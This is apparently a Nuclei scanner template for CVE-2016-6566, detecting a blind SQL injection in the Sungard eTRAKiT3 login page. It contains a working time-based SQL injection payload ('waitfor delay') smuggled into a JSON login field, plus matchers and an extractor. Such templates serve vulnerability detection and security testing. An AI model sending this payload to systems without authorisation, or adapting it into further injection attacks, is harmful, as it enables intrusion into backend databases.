id: cve-2016-6566

info:
  name: Sungard eTRAKiT3 Blind SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The login form in Sungard eTRAKiT3 is vulnerable to blind SQL injection via the `valueAsString` parameter in the JSON payload within the POST parameter `ucLogin_txtLoginId_ClientStat`. This allows an unauthenticated remote attacker to execute SQL queries on the backend server.
  reference:
    - https://www.kb.cert.org/vuls/id/846103
  tags: sqli,blind

http:
  - raw:
      - |
        POST /etrakit3/Login.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: {{len('{"ucLogin_txtLoginId_ClientStat":{"enabled":true,"emptyMessage":"Username","validationText":"fakeuser","valueAsString":"fakeuser';waitfor delay'0:0:10'--","lastSetTextBoxValue":"fakeuser"}}')}}

        {"ucLogin_txtLoginId_ClientStat":{"enabled":true,"emptyMessage":"Username","validationText":"fakeuser","valueAsString":"fakeuser';waitfor delay'0:0:10'--","lastSetTextBoxValue":"fakeuser"}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "contains(header, 'Content-Type: application/json')"

    extractors:
      - type: regex
        part: body
        regex:
          - "(\"valueAsString\":\")(.+?)(\")"
        group: 2